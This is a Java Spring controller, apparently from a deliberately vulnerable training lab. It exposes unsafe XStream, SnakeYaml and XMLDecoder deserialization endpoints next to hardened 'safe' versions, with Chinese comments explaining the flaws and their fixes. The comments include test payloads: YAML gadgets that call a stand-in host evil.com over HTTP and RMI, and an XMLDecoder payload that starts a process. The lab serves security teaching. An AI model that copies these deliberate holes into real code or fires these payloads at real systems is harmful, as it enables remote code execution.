package com.vulnlab.controller;

import com.thoughtworks.xstream.XStream;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.*;

import java.beans.XMLDecoder;
import java.io.ByteArrayInputStream;
import org.yaml.snakeyaml.Yaml;

/**
 * 扩展反序列化漏洞控制器
 *
 * 漏洞说明：
 * - XStream: XML 序列化库，1.4.10 版本存在多个 RCE 漏洞
 * - SnakeYaml: YAML 解析库，1.27 版本存在反序列化 RCE
 * - XMLDecoder: Java 原生 XML 反序列化，可执行任意代码
 *
 * 修复方案：
 * - XStream: 使用 setupDefaultSecurity() 或添加权限限制
 * - SnakeYaml: 使用 SafeConstructor
 * - XMLDecoder: 替换为安全的序列化方式
 *
 * @author VulnLab
 */
@RestController
@RequestMapping("/deserialize")
public class ExtendDeserializeController {

    private static final Logger logger = LoggerFactory.getLogger(ExtendDeserializeController.class);

    /**
     * XStream 反序列化漏洞
     *
     * 漏洞原理：XStream.fromXML() 可以反序列化任意类
     * 攻击向量：通过 XML 中的恶意类触发 RCE
     *
     * CVE: CVE-2017-9805, CVE-2020-26259 等
     * 影响版本: <= 1.4.15
     *
     * 测试 Payload:
     * <map><entry><string>key</string><string>value</string></entry></map>
     *
     * @param content XML 内容
     * @return 反序列化结果
     */
    @PostMapping("/xstream")
    public String xstream(@RequestBody String content) {
        logger.info("XStream deserialization attempt, content length: {}", content.length());

        try {
            // 漏洞代码：创建 XStream 实例，未设置安全限制
            XStream xs = new XStream();
            // 直接反序列化用户输入的 XML
            Object obj = xs.fromXML(content);

            logger.info("XStream deserialized object: {}", obj.getClass().getName());
            return "XStream deserialization completed. Object type: " + obj.getClass().getName();
        } catch (Exception e) {
            logger.error("XStream deserialization error", e);
            return "XStream deserialization error: " + e.getMessage();
        }
    }

    /**
     * XStream 安全版本示例（用于对比）
     *
     * @param content XML 内容
     * @return 反序列化结果
     */
    @PostMapping("/xstream/safe")
    public String xstreamSafe(@RequestBody String content) {
        logger.info("XStream safe deserialization attempt");

        try {
            XStream xs = new XStream();
            // 修复：启用默认安全配置
            XStream.setupDefaultSecurity(xs);
            // 或者使用更严格的权限控制
            // xs.addPermission(NoTypePermission.NONE);
            // xs.addPermission(NullPermission.NULL);
            // xs.allowTypes(new String[]{String.class});

            Object obj = xs.fromXML(content);
            return "XStream safe deserialization completed. Object: " + obj;
        } catch (Exception e) {
            logger.error("XStream safe deserialization error", e);
            return "XStream safe deserialization error: " + e.getMessage();
        }
    }

    /**
     * SnakeYaml 反序列化漏洞
     *
     * 漏洞原理：Yaml.load() 可以实例化任意类
     * 攻击向量：通过 YAML 中的 !! 前缀指定恶意类
     *
     * 测试 Payload:
     * !!java.net.URL [[!!java.net.URL ["http://evil.com/exp"]]]
     *
     * 或使用 JNDI:
     * !!com.sun.rowset.JdbcRowSetImpl {dataSourceName: "rmi://evil.com/exp", autoCommit: true}
     *
     * @param content YAML 内容
     * @return 反序列化结果
     */
    @PostMapping("/yaml")
    public String yaml(@RequestBody String content) {
        logger.info("SnakeYaml deserialization attempt, content: {}", content);

        try {
            // 漏洞代码：使用默认构造器，允许反序列化任意类
            Yaml y = new Yaml();
            // 直接加载用户输入的 YAML
            Object obj = y.load(content);

            logger.info("SnakeYaml deserialized object: {}", obj.getClass().getName());
            return "SnakeYaml deserialization completed. Object type: " + obj.getClass().getName();
        } catch (Exception e) {
            logger.error("SnakeYaml deserialization error", e);
            return "SnakeYaml deserialization error: " + e.getMessage();
        }
    }

    /**
     * SnakeYaml 安全版本示例（用于对比）
     *
     * @param content YAML 内容
     * @return 反序列化结果
     */
    @PostMapping("/yaml/safe")
    public String yamlSafe(@RequestBody String content) {
        logger.info("SnakeYaml safe deserialization attempt");

        try {
            // 修复：使用 SafeConstructor 只允许基本类型
            Yaml y = new Yaml(new org.yaml.snakeyaml.constructor.SafeConstructor());
            Object obj = y.load(content);

            return "SnakeYaml safe deserialization completed. Object: " + obj;
        } catch (Exception e) {
            logger.error("SnakeYaml safe deserialization error", e);
            return "SnakeYaml safe deserialization error: " + e.getMessage();
        }
    }

    /**
     * XMLDecoder 反序列化漏洞
     *
     * 漏洞原理：XMLDecoder.readObject() 可以执行任意代码
     * 攻击向量：通过 XML 中的 <object class> 和 <void method> 触发
     *
     * 测试 Payload:
     * <java>
     *   <object class="java.lang.ProcessBuilder">
     *     <array class="java.lang.String" length="1">
     *       <void index="0">
     *         <string>calc.exe</string>
     *       </void>
     *     </array>
     *     <void method="start"/>
     *   </object>
     * </java>
     *
     * @param content XML 内容
     * @return 反序列化结果
     */
    @PostMapping("/xmldecoder")
    public String xmldecoder(@RequestBody String content) {
        logger.info("XMLDecoder deserialization attempt, content length: {}", content.length());

        try {
            // 将字符串转换为字节流
            byte[] bytes = content.getBytes("UTF-8");
            ByteArrayInputStream bis = new ByteArrayInputStream(bytes);

            // 漏洞代码：直接使用 XMLDecoder 反序列化用户输入
            XMLDecoder xmlDecoder = new XMLDecoder(bis);
            Object obj = xmlDecoder.readObject();
            xmlDecoder.close();

            logger.info("XMLDecoder deserialized object: {}", obj.getClass().getName());
            return "XMLDecoder deserialization completed. Object type: " + obj.getClass().getName();
        } catch (Exception e) {
            logger.error("XMLDecoder deserialization error", e);
            return "XMLDecoder deserialization error: " + e.getMessage();
        }
    }

    /**
     * 简单测试端点 - 验证依赖是否加载
     *
     * @return 依赖版本信息
     */
    @GetMapping("/extend/info")
    public String info() {
        StringBuilder sb = new StringBuilder();
        sb.append("Extended Deserialization Vulnerabilities\n");
        sb.append("========================================\n");

        // 检查 XStream
        try {
            Class.forName("com.thoughtworks.xstream.XStream");
            sb.append("XStream: Available (version 1.4.10)\n");
        } catch (ClassNotFoundException e) {
            sb.append("XStream: Not available\n");
        }

        // 检查 SnakeYaml
        try {
            Class.forName("org.yaml.snakeyaml.Yaml");
            sb.append("SnakeYaml: Available (version 1.27)\n");
        } catch (ClassNotFoundException e) {
            sb.append("SnakeYaml: Not available\n");
        }

        // XMLDecoder 是 JDK 原生类
        sb.append("XMLDecoder: Available (JDK native)\n");

        sb.append("\nEndpoints:\n");
        sb.append("- POST /deserialize/xstream\n");
        sb.append("- POST /deserialize/yaml\n");
        sb.append("- POST /deserialize/xmldecoder\n");

        return sb.toString();
    }
}
